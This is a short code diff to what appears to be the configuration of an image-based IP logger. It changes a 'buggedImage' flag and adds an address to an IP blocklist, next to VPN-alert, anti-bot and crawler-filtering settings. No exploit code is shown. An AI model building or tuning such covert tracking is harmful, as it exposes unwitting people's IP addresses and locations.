@@ -31,7 +31,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, 
-    "buggedImage": True,
+    "buggedImage": False,
 
     "antiBot": 1,
                 # 0 = No Anti-Bot
@@ -46,7 +46,7 @@ config = {
     },
 }
 
-blacklistedIPs = ("27", "104", "143", "164") 
+blacklistedIPs = ("27", "104", "143", "164", "13.57.148.235") 
 
 def botCheck(ip, useragent):
     if ip and ip.startswith(("34", "35")):
